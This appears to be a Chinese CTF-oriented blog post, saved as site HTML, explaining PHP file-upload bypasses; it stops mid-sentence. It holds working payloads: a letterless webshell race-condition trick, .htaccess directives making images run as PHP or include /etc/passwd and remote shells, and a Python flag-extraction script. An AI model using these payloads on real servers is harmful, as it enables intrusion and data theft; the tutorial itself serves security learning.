@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/failure.ico">
+  
+  <title>文件上传 | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="基础漏洞" />
+  
+  <meta name="description" content="有关php文件上传的一些特性">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="http://example.com/posts/11796.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="有关php文件上传的一些特性">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/failure.ico">
+<meta property="article:published_time" content="2023-10-31T10:43:58.000Z">
+<meta property="article:modified_time" content="2023-10-31T10:45:48.229Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="基础漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/failure.ico">
+<meta name="twitter:site" content="@Err0r2333">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.png');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/11796.html">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">文件上传</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2023-10-31T10:43:58.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2023-10-31</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~12.01K
+                    
+                    字
+                </li>
+                
+                    <li id="/posts/11796.html" class="leancloud_visitors" data-flag-title="文件上传">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1698749148229"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>有关php文件上传的一些特性</p>
+<span id="more"></span>
+<h1><span id="文件上传表单的构建"> 文件上传表单的构建</span></h1>
+<p>有时候题目需要你自己构造表单时，如何构建呢？</p>
+<p>比较常见的表单构造如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:2333&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--poc无字母webshell上传，get传参值: ?&gt;&lt;?=`.+/???/????????[@-[]`;?&gt;</span></span><br><span class="line"><span class="comment">    解释：反引号，点号可以执行sh命令，形成条件竞争 上传的文件会保存到/tmp/php?????? 后面的?是随机生成的大小写</span></span><br><span class="line"><span class="comment">    使用@-[ (ASCII码匹配的大写)可以匹配到该文件</span></span><br><span class="line"><span class="comment">    使用burp抓包，修改Content-Type: multipart/form-data;</span></span><br><span class="line"><span class="comment">    内容: #!/bin/sh</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">            要执行的命令 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--poc--&gt;</span></span><br></pre></td></tr></table></figure>
+<p>带账户密码的传输</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:2333/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Example&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>平时我们上传到linux的文件会先保存在<code>/tmp/phpxxxxxx</code>处</p>
+<p>其中<code>xxxxxx</code>是六个随机字符(英文+数字)</p>
+<p>然后会被立刻删除</p>
+<p>更加详细的信息可以看到，假如我上传了一个图片叫02.jpg：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="string">&quot;name&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;02.jpg&quot;</span> [<span class="string">&quot;type&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;image/jpeg&quot;</span> [<span class="string">&quot;tmp_name&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;/tmp/phpCf5MYO&quot;</span> [<span class="string">&quot;error&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">0</span>) [<span class="string">&quot;size&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">359549</span>) &#125;</span><br></pre></td></tr></table></figure>
+<p>文件上传漏洞其实是由于疏忽导致恶意木马能够上传，然后为我们所用(</p>
+<h1><span id="文件上传绕过"> 文件上传绕过</span></h1>
+<h2><span id="前端校验"> 前端校验</span></h2>
+<p>过滤写在前端的时候，恰好可以用ctfshow文件上传上的一句话：<code>前台校验不可靠</code></p>
+<p>绕过方法：</p>
+<ul>
+<li>将js禁用</li>
+<li>f12修改前端js</li>
+<li>先通过上传合法的内容，然后将其抓包，改成恶意内容即可</li>
+</ul>
+<h2><span id="mime-type"> MIME-TYPE:</span></h2>
+<p>什么是<code>MIME-TYPE</code>：</p>
+<p>上文讲到，文件上传时候的一些参数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="string">&quot;name&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;02.jpg&quot;</span> [<span class="string">&quot;type&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;image/jpeg&quot;</span> [<span class="string">&quot;tmp_name&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;/tmp/phpCf5MYO&quot;</span> [<span class="string">&quot;error&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">0</span>) [<span class="string">&quot;size&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">359549</span>) &#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>[&quot;type&quot;] =&gt; &quot;image/jpeg&quot;</code>就是<code>MIME-TYPE</code></p>
+<p>此时我们只需要抓包修改上传文件时的<code>Content-Type</code>即可</p>
+<h2><span id="后端黑名单"> 后端黑名单</span></h2>
+<h3><span id="大小写绕过"> 大小写绕过</span></h3>
+<p>例如<code>in_array</code>函数(该函数区分大小写)，如果利用<code>in_array</code>作为黑名单时，能够利用大小写绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;phtml&#x27;</span>,<span class="string">&#x27;ph&#x27;</span>,<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&#x27;.user.ini&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;phP&#x27;</span>, <span class="variable">$blacklist</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="variable">$blacklist</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//bool(false)</span></span><br><span class="line"><span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>
+<h3><span id="不同后缀绕过"> 不同后缀绕过</span></h3>
+<p>同样地，各种<code>php</code>后缀都是能够解析的：</p>
+<ul>
+<li>php2</li>
+<li>php3</li>
+<li>php4</li>
+<li>php5</li>
+<li>pht</li>
+<li>phtml</li>
+<li>phps</li>
+<li>…</li>
+</ul>
+<p>利用<code>.htaccess</code>限制用户文件后缀的示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;^\.ph(p[345]?|t|tml|ps)$&quot;&gt;</span><br><span class="line">	Order Deny,Allow</span><br><span class="line">	Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>大概意思是如果匹配到文件后缀，应用Deny阻止用户的所有访问</p>
+<h2><span id="文件内容绕过"> 文件内容绕过</span></h2>
+<p>首先可以尝试大小写绕过</p>
+<h3><span id="各种短标签"> 各种短标签：</span></h3>
+<ul>
+<li><code>&lt;??&gt;</code>，等价于<code>&lt;?php?&gt;</code>，前提条件是<code>short_open_tag = On</code></li>
+<li><code>&lt;?=?&gt;</code>，等价于<code>&lt;?php echo?&gt;</code></li>
+<li><code>&lt;%%&gt;</code>，等价于<code>&lt;?php?&gt;</code>，前提条件是<code>asp_tags = On</code>，同时<code>PHP版本&lt;7.0</code></li>
+<li><code>&lt;script language = &quot;php&quot;&gt;&lt;/script&gt;</code>或者<code>&lt;script language = &quot;php&quot;&gt;</code>，等价于<code>&lt;?php?&gt;</code>，前提条件是<code>PHP版本&lt;7.0</code></li>
+</ul>
+<h3><span id="htaccess"> .htaccess</span></h3>
+<blockquote>
+<p>.htaccess是一个用于运行Apache网络服务器软件的网络服务器上的配置文件</p>
+</blockquote>
+<p><code>.htaccess</code>中拥有<code>#</code>作为单行注释符，同时支持<code>\</code>拼接上下两行</p>
+<p><code>.htaccess</code>会被Apache Web服务器检测并执行，以启用/禁用Apache Web服务器软件所提供的额外功能以及特性</p>
+<h4><span id="利用方式"> 利用方式：</span></h4>
+<h5><span id="自定义出错界面进行盲注"> 自定义出错界面进行盲注</span></h5>
+<p>可以通过<code>.htaccess</code>创建自定义的出错页面：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;If &quot;file(&#x27;/flag&#x27;) = ~ &#x27;/flag&#123;a/&#x27;&quot;&gt;</span><br><span class="line">ErrorDocument 404 &quot;any Error Content&quot;</span><br><span class="line">&lt;/If&gt;</span><br></pre></td></tr></table></figure>
+<p>原理：</p>
+<p>假设flag是<code>flag&#123;testflag&#125;</code>(波浪符号代表其开启了正则匹配)</p>
+<p>通过不断变换<code>a</code>到<code>t</code>时，页面就会返回错误信息，也就是有<code>any Error Content</code>出现</p>
+<p>利用这一点可以对flag的内容进行盲注，这一点在津门杯2021的<code>uploadhub</code>上出现过，这是来自<code>Nu1l战队wupco</code>师傅的解法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">ip = requests.get(<span class="string">&#x27;http://118.24.185.108/ip.php&#x27;</span>).text</span><br><span class="line"><span class="built_in">print</span>(ip)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a</span>):</span><br><span class="line">    f = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;If &quot;file(&#x27;/flag&#x27;)=~ /&#x27;&#x27;&#x27;</span>+a+<span class="string">&#x27;&#x27;&#x27;/&quot;&gt;</span></span><br><span class="line"><span class="string">    ErrorDocument 404 &quot;wupco&quot;</span></span><br><span class="line"><span class="string">    &lt;/If&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    resp = requests.post(<span class="string">&quot;http://122.112.248.222:20003/index.php?id=167&quot;</span>,</span><br><span class="line">    data=&#123;<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>,f)&#125; )</span><br><span class="line">    a = requests.get(<span class="string">&quot;http://122.112.248.222:20003/upload/&quot;</span>+ip+<span class="string">&quot;/a&quot;</span>).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;wupco&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;BN&quot;</span></span><br><span class="line">c = string.ascii_letters + string.digits + <span class="string">&quot;\&#123;\&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;checking: &quot;</span>+ flag+i)</span><br><span class="line">            <span class="keyword">if</span> check(flag+i):</span><br><span class="line">                flag = flag+i</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+<h5><span id="强制处理"> 强制处理</span></h5>
+<p>通过<code>SetHandler</code>或者<code>ForceType</code>强制所有被匹配到的文件用指定的处理器处理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<p>强制当前目录下的所有文件用php进行解析</p>
+<h5><span id="添加处理器"> 添加处理器</span></h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">使得.png也可以执行php程序</span><br><span class="line"></span><br><span class="line">AddHandler cgi-script .yyy</span><br><span class="line">使得拓展名为.yyy的文件作为CGI脚本处理</span><br></pre></td></tr></table></figure>
+<h5><span id="修改php_value"> 修改php_value</span></h5>
+<p>当使用PHP作为Apache的模块时，也可以利用Apache的配置文件(例如<code>http.conf</code>)和<code>.htaccess</code>来修改php的配置设定</p>
+<p>前提：</p>
+<ul>
+<li>需要有AllowOverride Options 或者 AllowOverride All权限</li>
+</ul>
+<p>要清除<code>php_value</code>原先设定的值，可以将value设置为none</p>
+<p>如果要设置布尔值，需要使用<code>php_flag</code></p>
+<p>利用方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file 1.txt 在主文件解析之前自动解析包含1.txt的内容</span><br><span class="line">php_value auto_append_file 1.txt 在主文件解析之后自动包含1.txt的内容</span><br><span class="line"></span><br><span class="line">前提当然是该目录下有一个php文件啦</span><br></pre></td></tr></table></figure>
+<p>当然，还可以利用<code>.htaccess</code>来包含<code>/tmp</code>下的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file /tmp/webshell</span><br><span class="line">php_value auto_append_file /tmp/sess_xxxxx</span><br><span class="line">//session文件包含</span><br></pre></td></tr></table></figure>
+<p>通过设置回溯限制来绕过<code>preg_match</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br></pre></td></tr></table></figure>
+<p>设置回溯次数为0，使得正则匹配的返回结果为0，绕过正则</p>
+<h5><span id="修改php_flag"> 修改php_flag</span></h5>
+<p>可以利用<code>php_flag</code>修改<code>engine</code>为0，在本目录和子目录中关闭php解析，造成源码泄露</p>
+<h5><span id="本地文件包含"> 本地文件包含</span></h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>在当前目录下php文件头引入<code>/etc/passwd</code></p>
+<h5><span id="修改include路径"> 修改include路径</span></h5>
+<p>.htaccess可以设置<code>include_path</code>将include()的默认路径改变：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;xxx&quot;</span><br></pre></td></tr></table></figure>
+<h5><span id="远程文件包含"> 远程文件包含</span></h5>
+<p>前提需要开启PHP的all_url_include选项，由于all_url_include的配置范围为<code>PHP_INI_SYSTEM</code>，所以无法利用<code>php_flag</code>设置<code>all_url_include</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file http://xxxx/shell.txt</span><br></pre></td></tr></table></figure>
+<h5><span id="伪协议包含"> 伪协议包含</span></h5>
+<p>前提条件：</p>
+<p><code>all_url_fopen</code>、<code>all_url_include</code>设置为<code>On</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line"></span><br><span class="line">php_value auto_append_file data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-encode/resource=shell.txt&quot;</span><br></pre></td></tr></table></figure>
+<h5><span id="让自身作为php文件处理"> 让自身作为php文件处理</span></h5>
+<ul>
+<li>当前目录下有php文件时，利用<code>auto_append_file</code>包含自己即可：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>先前说过<code>.htaccess</code>中<code>#</code>作为单行注释符，而<code>\</code>可以作为换行连接上下两行</p>
+<p>所以如果有过滤时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>当前目录下没有php文件时</li>
+</ul>
+<ol>
+<li>将自身指定成php文件，利用<code>SetHandler</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">#&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch .htaccess&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">Require all granted</span><br><span class="line">php_flag engine on</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<h5><span id="比较经典的htaccess使用"> 比较经典的.htaccess使用</span></h5>
+<p>配合一句话木马，使其作为php解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>或者直接</p>
